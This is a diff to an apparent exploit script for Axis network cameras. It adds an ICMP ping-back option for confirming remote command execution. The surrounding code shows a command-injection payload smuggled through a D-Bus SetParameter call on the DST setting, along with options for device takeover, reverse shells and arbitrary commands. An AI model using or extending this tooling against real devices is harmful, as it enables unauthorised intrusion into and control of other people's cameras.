@@ -48,6 +48,7 @@ parser.add_argument("-w", "--webserve", action="store_true", help="Serve content
 parser.add_argument("-f",   "--target-path", type=str, help="Target file path", default="index.shtml")
 parser.add_argument("-p",   "--proxy", type=str, help="Proxy to send requests in URL form 'http://IPADDRESS:PORT' (optional)")
 parser.add_argument("-s",   "--ssl", action="store_true", help="HTTPS")
+parser.add_argument("--icmp", action="store_true", help="ICMP ping back test")
 
 args = parser.parse_args()
 
@@ -104,6 +105,9 @@ if (args.takeover):
     import takeover
     exe_cmd = takeover.takeover_cmd(listen_ip, listen_port)
 else:
+    if (args.icmp):
+        exe_cmd = f"ping {listen_ip}"
+
     if (args.execute != None):
         exe_cmd = f"{args.execute}"
     else:
@@ -299,6 +303,9 @@ def dst_command_req():
         'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:root.Time.DST.Enabled string:;({cmd_ifs})&",
     }
     
+    if (args.icmp):
+        logging(f"+ Running ICMP ping back test...\n")
+
     logging(f"Stage {stage}: Injecting command to root.Time.DST.Enabled...\t\t")
     send_req(COMMAND_DATA)
     logging("+ Running sync to execute command\n")
@@ -330,7 +337,7 @@ def main():
     if (args.overlay_leak or args.overlay_leak_command):
         overlay_leak()
 
-    if (args.takeover) or (args.reverse) or (args.execute != None):
+    if (args.takeover) or (args.reverse) or (args.execute != None) or (args.icmp):
         if (not args.quiet):
             if (not args.takeover) and (not args.auto):
                 input("= Start listener if needed and press Enter to continue...")
